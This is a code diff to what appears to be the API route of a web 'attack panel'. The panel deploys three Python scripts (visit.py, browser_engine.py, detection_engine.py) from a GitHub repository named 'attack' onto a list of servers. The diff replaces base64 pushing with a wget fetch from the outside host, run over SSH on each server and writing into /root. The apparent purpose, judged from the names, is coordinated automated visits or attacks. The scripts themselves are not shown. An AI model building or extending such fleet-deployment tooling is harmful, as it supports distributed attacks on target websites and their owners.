@@ -113,33 +113,17 @@ export async function POST(req) {
       return NextResponse.json({ results });
 
     } else if (action === 'deploy') {
-      // Fetch all 3 script files from GitHub
-      const files = [
-        { name: 'visit.py', path: '/root/visit.py' },
-        { name: 'browser_engine.py', path: '/root/browser_engine.py' },
-        { name: 'detection_engine.py', path: '/root/detection_engine.py' },
-      ];
-      
-      const fileData = {};
-      for (const file of files) {
-        try {
-          const ghResp = await fetch(`https://raw.githubusercontent.com/fanarali881-eng/attack/main/${file.name}`, {
-            headers: { 'User-Agent': 'attack-panel' }
-          });
-          if (!ghResp.ok) throw new Error(`GitHub returned ${ghResp.status}`);
-          const content = await ghResp.text();
-          fileData[file.name] = Buffer.from(content).toString('base64');
-        } catch(e) {
-          return NextResponse.json({ error: `Could not fetch ${file.name} from GitHub: ${e.message}` }, { status: 500 });
-        }
-      }
+      // Download all 3 script files directly on each server from GitHub
+      const ghBase = 'https://raw.githubusercontent.com/fanarali881-eng/attack/main';
+      const files = ['visit.py', 'browser_engine.py', 'detection_engine.py'];
+      const downloadCmds = files.map(f => 
+        `wget -q -O /root/${f} '${ghBase}/${f}'`
+      ).join(' && ');
+      const deployCmd = `${downloadCmds} && wc -c /root/visit.py /root/browser_engine.py /root/detection_engine.py && echo "Script v13 deployed (3 files)"`;
       
       const results = await Promise.all(
         serverList.map(async (server) => {
-          const deployCmd = files.map(f => 
-            `echo "${fileData[f.name]}" | base64 -d > ${f.path}`
-          ).join(' && ') + ' && wc -c /root/visit.py /root/browser_engine.py /root/detection_engine.py && echo "Script v13 deployed (3 files)"';
-          const r = await runSSHCommand(server, deployCmd, 20000);
+          const r = await runSSHCommand(server, deployCmd, 30000);
           return { host: server.host, ...r };
         })
       );
